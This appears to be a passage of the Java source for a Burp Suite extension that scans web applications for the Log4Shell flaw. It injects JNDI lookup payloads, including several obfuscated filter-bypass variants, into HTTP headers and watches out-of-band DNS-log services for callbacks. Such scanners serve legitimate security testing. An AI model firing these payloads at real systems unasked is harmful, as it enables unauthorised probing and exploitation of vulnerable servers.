package burp;

import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.*;
import java.net.URL;
import java.util.*;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.lang3.RandomStringUtils;

/*
* 0.19.funny dev note
* 20220617 dev list
*   add a "dnslog.cn" dnslog platfrom chocie            done!
*   make it to a slowly passively auto-detection
*   more methods to bypass                              update continually...
*   more position in request to inject log4j2 payload   done!
* 20220623 dev list
*   fix the code bug                                    done!
*   test all program fuction                            done!
*/
/*
* 0.20.funny update note
* 20220629 update list 
*   fix the bug - cant send request without response to log4j2 scanner
*   update the feature - log4j2 scanner will show the records even though of which the request doesnt get a response
*/
/*
* 0.21.funny update note
* 20220704 update list 
*   update the feature - change how the plugin modifies custom_dnslog_protocol
* 
*/
/*
* 0.22.funny update note
* 20220801 update list
*   optimize the code - use "Abstract Factory" to dnslog platforms list, make it more easy to maintain current platforms or increase a new one
*   update the feature - add a random bypass mode like j => ${"random_str":"random_str":"random_str"... - j}
*   update the feature - support privatedns mode
*/
/*
* 0.23.funny update note
* 20220818 update list
*   fix the bug - print massage with a lot of "null" when dnslog platform is failed 
*   fix the bug - X-forward-for can be disabled
*   fix the bug - a test println forgot to delete
*/
/*
 * 0.24.funny update note
 * 20230320 update list
 *   optimize the code - change all chinese comment to english comment 
 *   optimize the code - optimize the function askDnslogRecordOnce
 *   fix the bug - dnslog.cn cant work, because the missing cookie of request
 */

public class BurpExtender extends AbstractTableModel
        implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory {
    // public class BurpExtender extends AbstractTableModel implements
    // IBurpExtender, IScannerCheck, ITab, IMessageEditorController {
    private IBurpExtenderCallbacks callbacks;

    private IExtensionHelpers helpers;

    private PrintWriter stdout;

    private JSplitPane mjSplitPane;

    private List<TablesData> Udatas = new ArrayList<>();

    private IMessageEditor HRequestTextEditor;

    private IMessageEditor HResponseTextEditor;

    private IHttpRequestResponse currentlyDisplayedItem;

    private URLTable Utable;

    private JScrollPane UscrollPane;

    private JSplitPane HjSplitPane;

    private JTabbedPane Ltable;

    private JTabbedPane Rtable;

    private JTabbedPane Rtable2;

    private JTextArea textArea1;

    private JCheckBox log4j2passivepattern_box;

    private JCheckBox isuseUserAgentTokenXff_CheckBox;

    private JCheckBox isuseXfflists_CheckBox;

    private JCheckBox isuseAllCookie_CheckBox;

    private JCheckBox isuseRefererOrigin_CheckBox;

    private JCheckBox isuseContenttype_CheckBox;

    private JCheckBox isuseAccept_CheckBox;

    private JTextField fieldd1; // jndi param

    private JComboBox<String> fieldd2; // protocol(dns/ldap/rmi)

    private JComboBox<String> fieldd3; // dnslog method

    private JTextField field2; // token of ceye

    private JTextField field3; // dnslog address of ceye

    private JTextField field4; // privatedns

    private JTextArea whitelists_area;

    private JTextArea customheaders_area;

    private dnslogFactory myDnslogFactory;

    public String logxn_dnslog;

    // List<String> list = new ArrayList<String>();

    public List<String> toHosts = new ArrayList<String>(); // host list which still need to check whether log4j2 vulnerability exists

    public List<String> toHosts_vuln = new ArrayList<String>(); // host list where log4j2 vulnerability is confirmed
    
    public boolean ispolling;

    // remove these boolean, use log_method plz
    /*
     * private Boolean logxn;
     * private Boolean ceyeio;
     * private Boolean burpdns;
     * private Boolean privatedns;
     */

    /**
     * 0:log.xn--9tr.com
     * 1:ceye.io
     * 2:dnslog.cn
     * 3:privatedns
     * 4:
     * 5:brup-dnslog *do not support yet
     */
    public int log_method;
    private Boolean passivepattern;// whether use passive scan
    // private String burp_dnslog;
    private String ceyednslog;// ceye.io dnslog url(xxxxxx.ceye.io)
    private String ceyetoken;// ceye.io token
    private String privatedns;
    // private Boolean isip;
    // private Boolean isipincreasing;
    private Boolean isuseUserAgentTokenXff;
    private Boolean isuseXfflists;
    private Boolean isuseAllCookie;
    private Boolean isuseRefererOrigin;
    private Boolean isuseContenttype;
    private Boolean isuseAccept;

    private static String[] dnslog_protocol_list = { "**custom**", "jndi:ldap:", "jndi:rmi:", "jndi:dns:",
            "jndi${::-:}ldap${::-:}", "jndi${::-:}rmi${::-:}",
            "${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}",
            "${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-r}mi${env:NaN:-:}", "**use ${randomstr : - } full bypass**" };
    private String custom_dnslog_protocol; // custom payload

    /**
     * 0: **custom**
     * 1: jndi:ldap:
     * 2: jndi:rmi:
     * 3: jndi:dns:
     * 4: jndi${::-:}ldap${::-:}
     * 5: jndi${::-:}rmi${::-:}
     * 6: ${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}
     * 7: ${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-r}mi${env:NaN:-:}
     * 8: **use ${randomstr : - } full bypass**
     */
    private int dnslog_protocol_index; // dnslog_protocol_list[]'s choosen index
    private String[] whitelists; // {'*.gov.cn','*.edu.cn'}
    private String[] customlists; // {'X-Client-IP','X-Requested-With','X-Api-Version'}

    // private IBurpCollaboratorClientContext collaboratorContext;

    /**
     * my Request
     * 
     * @param url
     *            the request url
     * @return Response
     *         the okhttp3 response
     */
    public static Response myRequest(String url, String cookie) throws IOException, AWTException {
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .build();
        Request loginReq = new Request.Builder()
                .url(url)
                .addHeader("Cookie", cookie)
                .get()
                .build();

        Call call = client.newCall(loginReq);
        try {
            Robot r = new Robot();
            r.delay(3000);
        } catch (AWTException e) {
            e.printStackTrace();
        }
        Response response = null;
        try {
            response = call.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return response;
    }

    /**
     * print funtions
     */
    public void checkSuccess(){
        this.stdout.println("=============================================");
        this.stdout.println("[+]               load successful!           ");
        this.stdout.println("[+]        log4j2burpscanner v0.20.funny       ");
        this.stdout.println("[+] https://github.com/f0ng/log4j2burpscanner");
        this.stdout.println("[+]               recode by funnyndk            ");
        this.stdout.println("=============================================");
    }

    /**
     * create a defualt log4j2burpscanner.properties
     */
    public void propertiesCreate(File f) throws IOException {
        f.createNewFile();
        try {
            FileWriter fileWriter = new FileWriter(f);
            fileWriter.append("log_method=0\n");
            fileWriter.append("passivepattern=false\n");
            fileWriter.append("ceyetoken=xxxxxx\n");
            fileWriter.append("privatedns=xxxxxx\n");
            fileWriter.append("ceyednslog=xxxx.ceye.io\n");
            fileWriter.append("isuseUserAgentTokenXff=true\n");
            fileWriter.append("isuseXfflists=false\n");
            fileWriter.append("isuseAllCookie=true\n");
            fileWriter.append("isuseRefererOrigin=false\n");
            fileWriter.append("isuseContenttype=false\n");
            fileWriter.append("isuseAccept=false\n");
            fileWriter.append("custom_dnslog_protocol=jndi:ldap:\n");
            fileWriter.append("dnslog_protocol_index=1\n");
            fileWriter.append("whitelists=*.gov.cn *.edu.cn\n");
            fileWriter.append("customlists=X-Client-IP X-Requested-With X-Api-Version\n");
            fileWriter.flush();
            fileWriter.close();
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    /**
     * read in log4j2burpscanner.properties and set all variables
     */
    public void propertiesRead(File f) throws IOException {
        Properties my_Properties = new Properties();
        InputStream in = new BufferedInputStream(new FileInputStream(f));
        my_Properties.load(in);
        try {
            this.log_method = my_Properties.get("log_method") != null
                    ? Integer.parseInt(my_Properties.get("log_method").toString())
                    : 0;
            this.passivepattern = Boolean.parseBoolean(my_Properties.get("passivepattern").toString());
            this.ceyednslog = my_Properties.get("ceyednslog") != null ? my_Properties.get("ceyednslog").toString()
                    : null;
            this.ceyetoken = my_Properties.get("ceyetoken") != null ? my_Properties.get("ceyetoken").toString() : null;
            this.privatedns = my_Properties.get("privatedns") != null ? my_Properties.get("ceyetoken").toString()
                    : null;
            this.isuseUserAgentTokenXff = Boolean.parseBoolean(my_Properties.get("isuseUserAgentTokenXff").toString());
            this.isuseXfflists = Boolean.parseBoolean(my_Properties.get("isuseXfflists").toString());
            this.isuseAllCookie = Boolean.parseBoolean(my_Properties.get("isuseAllCookie").toString());
            this.isuseRefererOrigin = Boolean.parseBoolean(my_Properties.get("isuseRefererOrigin").toString());
            this.isuseContenttype = Boolean.parseBoolean(my_Properties.get("isuseContenttype").toString());
            this.isuseAccept = Boolean.parseBoolean(my_Properties.get("isuseAccept").toString());
            this.custom_dnslog_protocol = my_Properties.get("custom_dnslog_protocol") != null
                    ? my_Properties.get("custom_dnslog_protocol").toString()
                    : "jndi:ldap:";
            this.dnslog_protocol_index = my_Properties.get("dnslog_protocol_index") != null
                    ? Integer.parseInt(my_Properties.get("dnslog_protocol_index").toString())
                    : 0;
            // Pretreatment for two list
            this.whitelists = my_Properties.get("whitelists") != null
                    ? my_Properties.get("whitelists").toString().split(" ")
                    : null;
            this.customlists = my_Properties.get("customlists") != null
                    ? my_Properties.get("customlists").toString().split(" ")
                    : null;
        } catch (Exception e) {
            // TODO: handle exception
        }
        totalCheckAndPrint();
    }

    /**
     * save panel to variables
     */
    public void savePanleToVariables() {
        this.log_method = fieldd3.getSelectedIndex();
        this.passivepattern = log4j2passivepattern_box.isSelected();
        this.isuseUserAgentTokenXff = isuseUserAgentTokenXff_CheckBox.isSelected();
        this.isuseXfflists = isuseXfflists_CheckBox.isSelected();
        this.isuseAllCookie = isuseAllCookie_CheckBox.isSelected();
        this.isuseRefererOrigin = isuseRefererOrigin_CheckBox.isSelected();
        this.isuseContenttype = isuseContenttype_CheckBox.isSelected();
        this.isuseAccept = isuseAccept_CheckBox.isSelected();
        this.dnslog_protocol_index = fieldd2.getSelectedIndex();

        this.ceyednslog = field3.getText();
        this.ceyetoken = field2.getText();
        this.privatedns = field4.getText();
        this.custom_dnslog_protocol = fieldd1.getText();
        // Pretreatment for two list
        this.whitelists = whitelists_area.getText().split("\n");
        this.customlists = customheaders_area.getText().split("\n");
    }

    /**
     * save properties to log4j2burpscanner.properties
     * 
     * @param f
     *          the properties file
     * @return massage to show whether save is success
     */
    public String saveProperties(File f) {
        savePanleToVariables();
        Properties my_Properties = new Properties();
        // log_method
        my_Properties.setProperty("log_method", String.valueOf(this.log_method));
        // passivepattern
        my_Properties.setProperty("passivepattern", String.valueOf(this.passivepattern));
        // ceyednslog
        my_Properties.setProperty("ceyednslog", String.valueOf(this.ceyednslog));
        // ceyetoken
        my_Properties.setProperty("ceyetoken", String.valueOf(this.ceyetoken));
        // privatedns
        my_Properties.setProperty("privatedns", String.valueOf(this.privatedns));
        // isuseUserAgentTokenXff
        my_Properties.setProperty("isuseUserAgentTokenXff", String.valueOf(this.isuseUserAgentTokenXff));
        // isuseXfflists
        my_Properties.setProperty("isuseXfflists", String.valueOf(this.isuseXfflists));
        // isuseAllCookie
        my_Properties.setProperty("isuseAllCookie", String.valueOf(this.isuseAllCookie));
        // isuseRefererOrigin
        my_Properties.setProperty("isuseRefererOrigin", String.valueOf(this.isuseRefererOrigin));
        // isuseContenttype
        my_Properties.setProperty("isuseContenttype", String.valueOf(this.isuseContenttype));
        // isuseAccept
        my_Properties.setProperty("isuseAccept", String.valueOf(this.isuseAccept));
        // custom_dnslog_protocol
        my_Properties.setProperty("custom_dnslog_protocol", String.valueOf(this.custom_dnslog_protocol));
        // dnslog_protocol_index
        my_Properties.setProperty("dnslog_protocol_index", String.valueOf(this.dnslog_protocol_index));
        // whitelists
        my_Properties.setProperty("whitelists", String.join(" ", this.whitelists));
        // customlists
        my_Properties.setProperty("customlists", String.join(" ", this.customlists));
        String Content;
        try {
            FileOutputStream fout = new FileOutputStream(f);
            my_Properties.store(fout, "");
            Content = "Successfully Save To " + f.getAbsolutePath();
        } catch (Exception e) {
            Content = "Save Fail!" + e.getMessage();
        }
        totalCheckAndPrint();
        return Content;
    }

    /**
     * after setting all variables, refresh the panle
     */
    public void panleRefresh() throws IllegalArgumentException,IOException {
        // panle 1
        this.log4j2passivepattern_box.setSelected(this.passivepattern);
        fieldd3.setSelectedIndex(this.log_method);
        field2.setText(this.ceyetoken);
        field3.setText(this.ceyednslog);
        field4.setText(this.privatedns);
        // panle 2
        this.isuseUserAgentTokenXff_CheckBox.setSelected(this.isuseUserAgentTokenXff);
        this.isuseXfflists_CheckBox.setSelected(this.isuseXfflists);
        this.isuseAllCookie_CheckBox.setSelected(this.isuseAllCookie);
        this.isuseRefererOrigin_CheckBox.setSelected(this.isuseRefererOrigin);
        this.isuseContenttype_CheckBox.setSelected(this.isuseContenttype);
        this.isuseAccept_CheckBox.setSelected(this.isuseAccept);

        fieldd1.setText(this.custom_dnslog_protocol);
        fieldd2.setSelectedIndex(this.dnslog_protocol_index);
        whitelists_area.setText(String.join("\n", this.whitelists));
        customheaders_area.setText(String.join("\n", this.customlists));
    }

    /**
     * check the Properties,
     * check whether the choosen dnslog method is working,
     * then print message to stdout
     */
    public void totalCheckAndPrint() {
        checkSuccess();
        try {
            switch (this.log_method) {
                case 0:
                    this.myDnslogFactory = new logxnFactory();
                    this.myDnslogFactory.initDnslog(this.stdout);
                    break;
                case 1:
                    this.myDnslogFactory = new ceyeFactory(this.ceyednslog, this.ceyetoken);
                    this.myDnslogFactory.initDnslog(this.stdout);
                    break;
                case 2:
                    this.myDnslogFactory = new dnslogcnFactory();
                    this.myDnslogFactory.initDnslog(this.stdout);
                    break;
                case 3:
                    this.myDnslogFactory = new privateFactory(this.privatedns);
                    this.myDnslogFactory.initDnslog(this.stdout);
                    break;
            } 
        } catch (Exception e) {
            return ;
        }
        this.myDnslogFactory.printDnslog();
    }

    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {

        String os = System.getProperty("os.name");
        File f;

        /*
         * according to .properties file, check whether the dnslog platfrom is working
         * then print to stdout
         */
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName("log4j2burpscanner");


        /*
         * check whether .properties file is configured, otherwise create a new
         * properties.
         * then read all properties.
         */
        if (os.toLowerCase().startsWith("win")) {
            f = new File("log4j2burpscanner.properties");
        } else {
            String jarPath = callbacks.getExtensionFilename(); // get jar path
            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
        }
        if (!f.exists()) {
            try {
                this.propertiesCreate(f);
            } catch (IOException e1) {
                this.stdout.println("[E] propertiesCreate() fail!");
            }
        }

        try {

            // according to the log_method, instance the suitable class
            this.propertiesRead(f);
            

        } catch (Exception e) {
            this.stdout.println("[E] propertiesRead() fail!");
        }
        

        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                BurpExtender.this.textArea1 = new JTextArea("");
                BurpExtender.this.mjSplitPane = new JSplitPane(0);
                BurpExtender.this.Utable = new BurpExtender.URLTable(BurpExtender.this);

                BurpExtender.this.Utable.getColumnModel().getColumn(0).setPreferredWidth(2); // URL
                BurpExtender.this.Utable.getColumnModel().getColumn(1).setPreferredWidth(2); // METHOD
                BurpExtender.this.Utable.getColumnModel().getColumn(3).setPreferredWidth(2); // status

                BurpExtender.this.UscrollPane = new JScrollPane(BurpExtender.this.Utable);
                BurpExtender.this.HjSplitPane = new JSplitPane();

                BurpExtender.this.HjSplitPane.setDividerLocation(550);
                BurpExtender.this.mjSplitPane.setDividerLocation(230);
                BurpExtender.this.Ltable = new JTabbedPane();
                BurpExtender.this.HRequestTextEditor = BurpExtender.this.callbacks
                        .createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Ltable.addTab("Request", BurpExtender.this.HRequestTextEditor.getComponent());
                BurpExtender.this.Rtable = new JTabbedPane();

                BurpExtender.this.Rtable2 = new JTabbedPane();

                JPanel panel = new JPanel(); // creat a dnslog panel
                panel.setAlignmentX(0.0f);
                panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
                panel.setBorder(new EmptyBorder(10, 10, 10, 10));

                JPanel panel12 = new JPanel();
                panel12.setBorder(BorderFactory.createTitledBorder("log4j2 switch"));// main configuration
                panel12.setLayout(new BoxLayout(panel12, BoxLayout.X_AXIS));

                JPanel panel2 = new JPanel();
                panel2.setBorder(BorderFactory.createTitledBorder("ceye config")); // ceye.io
                panel2.setLayout(new BoxLayout(panel2, BoxLayout.X_AXIS));

                JPanel panel3 = new JPanel();
                panel3.setLayout(new BoxLayout(panel3, BoxLayout.X_AXIS));

                JButton btn1 = new JButton("Save configuration");
                btn1.addMouseListener(new MouseAdapter() {

                    @Override
                    public void mouseClicked(MouseEvent e) {
                        JOptionPane.showMessageDialog(null, saveProperties(f), "Save", JOptionPane.INFORMATION_MESSAGE);
                    }

                });

                JButton btn2 = new JButton("Load configuration");
                btn2.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e) {
                        try {
                            propertiesRead(f);
                            panleRefresh();
                            JOptionPane.showMessageDialog(null, "load success", "Load",
                                    JOptionPane.INFORMATION_MESSAGE);
                        } catch (Exception x) {
                            JOptionPane.showMessageDialog(null, x.getMessage(), "Load",
                                    JOptionPane.INFORMATION_MESSAGE);
                            return;
                        }
                    }
                });

                JButton btn3 = new JButton("Test dnslog");
                btn3.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e) {
                        JOptionPane.showMessageDialog(null, myDnslogFactory.testDnslog(), "Test",
                                JOptionPane.INFORMATION_MESSAGE);
                    }
                });

                JLabel label12 = new JLabel("log4j2 Passive Scanner:");
                BurpExtender.this.log4j2passivepattern_box = new JCheckBox();

                JLabel label_method = new JLabel("dnslog_method:");
                String[] method_list = { "log.xn", "ceye.io", "dnslog.cn(not recommended)", "privatedns" };
                BurpExtender.this.fieldd3 = new JComboBox<>(method_list); //

                // JLabel label1 = new JLabel("isuseceye:");
                // BurpExtender.this.isuseceye_box = new JCheckBox();

                JLabel label2 = new JLabel("ceyetoken:");
                BurpExtender.this.field2 = new JTextField(); // token of ceye

                JLabel label3 = new JLabel("ceyednslog:");
                BurpExtender.this.field3 = new JTextField(); // dnslog address of ceye

                JLabel label4 = new JLabel("privatednslog:");
                BurpExtender.this.field4 = new JTextField(); // dnslog address of ceye

                GroupLayout layout12 = new GroupLayout(panel12);
                panel12.setLayout(layout12);
                layout12.setAutoCreateGaps(true);
                layout12.setAutoCreateContainerGaps(true);
                layout12.setHorizontalGroup(layout12.createSequentialGroup()
                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                .addComponent(label12)
                                .addComponent(label_method))

                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.log4j2passivepattern_box)
                                .addComponent(BurpExtender.this.fieldd3)));

                layout12.setVerticalGroup(layout12.createSequentialGroup()

                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label12)
                                .addComponent(BurpExtender.this.log4j2passivepattern_box))

                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label_method)
                                .addComponent(BurpExtender.this.fieldd3)));

                GroupLayout layout = new GroupLayout(panel2);
                panel2.setLayout(layout);
                layout.setAutoCreateGaps(true);
                layout.setAutoCreateContainerGaps(true);
                layout.setHorizontalGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                .addComponent(label2)
                                .addComponent(label3)
                                .addComponent(label4))

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.field2)
                                .addComponent(BurpExtender.this.field3)
                                .addComponent(BurpExtender.this.field4)));

                layout.setVerticalGroup(layout.createSequentialGroup()

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label2)
                                .addComponent(BurpExtender.this.field2))

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label3)
                                .addComponent(BurpExtender.this.field3))

                        .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(label4)
                                .addComponent(BurpExtender.this.field4)));

                panel.add(panel12);
                panel.add(panel2);

                panel3.add(btn1);
                panel3.add(btn2);
                panel3.add(btn3);
                panel.add(panel3);

                BurpExtender.this.Rtable2.addTab("dnslog configuration", panel);

                JPanel panell = new JPanel();
                panell.setAlignmentX(0.0f);
                panell.setLayout(new BoxLayout(panell, BoxLayout.Y_AXIS));
                panell.setBorder(new EmptyBorder(10, 10, 10, 10));

                JPanel panell2 = new JPanel();
                panell2.setBorder(BorderFactory.createTitledBorder("custom params(including bypass)"));
                panell2.setLayout(new BoxLayout(panel2, BoxLayout.X_AXIS));

                JPanel panell3 = new JPanel(); // panel for button
                panel3.setLayout(new BoxLayout(panel3, BoxLayout.X_AXIS));

                JLabel labell1 = new JLabel("custom custom_dnslog_protocol:");
                BurpExtender.this.fieldd1 = new JTextField(); 

                JLabel labell2 = new JLabel("custom_dnslog_protocol:");
                BurpExtender.this.fieldd2 = new JComboBox<>(dnslog_protocol_list);

                JLabel labell3 = new JLabel("white lists:");
                BurpExtender.this.whitelists_area = new JTextArea(4, 40);
                BurpExtender.this.whitelists_area.setLineWrap(true);

                JLabel labell4 = new JLabel("custom headers lists:");
                BurpExtender.this.customheaders_area = new JTextArea(4, 40);
                BurpExtender.this.customheaders_area.setLineWrap(true);

                JPanel panelOutput = new JPanel();
                panelOutput.add(new JScrollPane(BurpExtender.this.whitelists_area));

                JPanel panelOutput2 = new JPanel();
                panelOutput2.add(new JScrollPane(BurpExtender.this.customheaders_area));

                JLabel isuseUserAgentTokenXff_label = new JLabel("test UserAgentTokenXff");
                BurpExtender.this.isuseUserAgentTokenXff_CheckBox = new JCheckBox();

                JLabel isuseXfflists_label = new JLabel("test Xfflists:");
                BurpExtender.this.isuseXfflists_CheckBox = new JCheckBox();

                JLabel isuseAllCookie_label = new JLabel("test Cookie:");
                BurpExtender.this.isuseAllCookie_CheckBox = new JCheckBox();

                JLabel isuseRefererOrigin_label = new JLabel("test RefererOrigin:");
                BurpExtender.this.isuseRefererOrigin_CheckBox = new JCheckBox();

                JLabel isuseContenttype_label = new JLabel("test Contenttype:");
                BurpExtender.this.isuseContenttype_CheckBox = new JCheckBox();

                JLabel isuseAccept_label = new JLabel("test Accept:");
                BurpExtender.this.isuseAccept_CheckBox = new JCheckBox();

                GroupLayout layoutt1 = new GroupLayout(panell2);
                panell2.setLayout(layoutt1);
                layoutt1.setAutoCreateGaps(true);
                layoutt1.setAutoCreateContainerGaps(true);
                layoutt1.setHorizontalGroup(layoutt1.createSequentialGroup()
                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                .addComponent(labell1)
                                .addComponent(labell2)
                                .addComponent(labell3)
                                .addComponent(labell4)
                                .addComponent(isuseUserAgentTokenXff_label)
                                .addComponent(isuseXfflists_label)
                                .addComponent(isuseAllCookie_label)
                                .addComponent(isuseRefererOrigin_label)
                                .addComponent(isuseContenttype_label)
                                .addComponent(isuseAccept_label))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.fieldd1)
                                .addComponent(BurpExtender.this.fieldd2)
                                .addComponent(panelOutput)
                                .addComponent(panelOutput2)
                                .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox)
                                .addComponent(BurpExtender.this.isuseXfflists_CheckBox)
                                .addComponent(BurpExtender.this.isuseAllCookie_CheckBox)
                                .addComponent(BurpExtender.this.isuseRefererOrigin_CheckBox)
                                .addComponent(BurpExtender.this.isuseContenttype_CheckBox)
                                .addComponent(BurpExtender.this.isuseAccept_CheckBox)));

                layoutt1.setVerticalGroup(layoutt1.createSequentialGroup()
                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell1)
                                .addComponent(BurpExtender.this.fieldd1))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell2)
                                .addComponent(BurpExtender.this.fieldd2))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell3)
                                .addComponent(panelOutput))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(labell4)
                                .addComponent(panelOutput2))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseUserAgentTokenXff_label)
                                .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseXfflists_label)
                                .addComponent(BurpExtender.this.isuseXfflists_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseAllCookie_label)
                                .addComponent(BurpExtender.this.isuseAllCookie_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseRefererOrigin_label)
                                .addComponent(BurpExtender.this.isuseRefererOrigin_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseContenttype_label)
                                .addComponent(BurpExtender.this.isuseContenttype_CheckBox))

                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(isuseAccept_label)
                                .addComponent(BurpExtender.this.isuseAccept_CheckBox)));

                JButton btn_1 = new JButton("Save configuration");
                btn_1.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e) {
                        JOptionPane.showMessageDialog(null, saveProperties(f), "Save", JOptionPane.INFORMATION_MESSAGE);
                    }
                });

                JButton btn_2 = new JButton("Load configuration");
                btn_2.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e) {
                        try {
                            propertiesRead(f);
                            panleRefresh();
                            JOptionPane.showMessageDialog(null, "load success.", "Load",
                                    JOptionPane.INFORMATION_MESSAGE);
                        } catch (Exception x) {
                            JOptionPane.showMessageDialog(null, x.getMessage(), "Load",
                                    JOptionPane.INFORMATION_MESSAGE);
                            return;
                        }
                    }
                });

                panell3.add(btn_1);
                panell3.add(btn_2);
                panell.add(panell2);
                panell.add(panell3);

                BurpExtender.this.Rtable2.addTab("custom params", panell);

                BurpExtender.this.HResponseTextEditor = BurpExtender.this.callbacks
                        .createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Rtable.addTab("Response", BurpExtender.this.HResponseTextEditor.getComponent());
                BurpExtender.this.Rtable.addTab("Config", BurpExtender.this.Rtable2);

                BufferedReader reader = null;
                StringBuffer sbf = new StringBuffer();
                String output = "";
                try {
                    reader = new BufferedReader(new FileReader(f));
                    String tempStr;
                    while ((tempStr = reader.readLine()) != null) {
                        sbf.append(tempStr + '\n');
                    }
                    reader.close();
                    output = sbf.toString();
                } catch (IOException e) {
                }
                BurpExtender.this.textArea1.setText(output);

                try {
                    panleRefresh();
                } catch (Exception e) {
                    //TODO: handle exception
                }
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Ltable, "left"); // request
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Rtable, "right"); // response
                BurpExtender.this.HjSplitPane.setEnabled(false);
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.UscrollPane, "left");
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.HjSplitPane, "right");

                BurpExtender.this.callbacks.customizeUiComponent(BurpExtender.this.mjSplitPane);
                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
            }
        });
        callbacks.registerScannerCheck(this);
        callbacks.registerContextMenuFactory(this);
    }

    public String headers_to_host(List<String> request_header) {
        for (String request_header_single : request_header) {
            if (request_header_single.substring(0, 5).contains("Host")
                    || request_header_single.substring(0, 5).contains("host")) {
                String[] request_header_single_lists = request_header_single.split(":");
                return request_header_single_lists[1].trim();
            }
        }
        return null;
    }

    /**
     * inject vulnurl to request.header
     * 
     * @param vulnurl
     *                       the log4j2 payload you generate
     * @param request_header
     *                       IExtensionHelpers.analyzeRequest(IHttpRequestResponse.getRequest()).getHeaders().
     *                       for more info, see brup APIs
     * @return request_header
     *         a List<String> contains request header which is finishing vulnurl
     *         injection
     *         eg.["User-Agent:123${jndi:ladp:...}","Cookie:123${jndi:ladp:...}"]
     */
    public List<String> injectHeader(String vulnurl, List<String> request_header) {
        for (int i = 0; i < request_header.size(); i++) {
            // this.stdout.println(request_header.get(i));
            if (this.isuseUserAgentTokenXff && (request_header.get(i).contains("User-Agent:")
                    || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:")
                    || request_header.get(i).contains("Bearer Token:"))) {
                request_header.set(i, request_header.get(i) + vulnurl);
                continue;
            }
            if (this.isuseUserAgentTokenXff && request_header.get(i).contains("X-Forwarded-For:")) {
                request_header.set(i, request_header.get(i) + vulnurl);
                continue;
            }
            // if (request_header.get(i).contains("X-Client-IP:") &&
            // this.isuseUserAgentTokenXff){
            // request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl,
            // param_i++,this.isipincreasing));
            // }
            if (this.isuseUserAgentTokenXff && request_header.get(i).contains("X-Api-Version:")) {
                request_header.set(i, request_header.get(i) + vulnurl);
                continue;
            }
            // Content-Type, Referer, Accept-Language, Accept, Accept-Encoding, Origin
            if (this.isuseContenttype && request_header.get(i).contains("Content-Type:")) {
                // stdout.println(isuseRefererOrigin);
                request_header.set(i, request_header.get(i) + vulnurl.replace("%24", "$"));
                continue;
            }
            if (this.isuseRefererOrigin
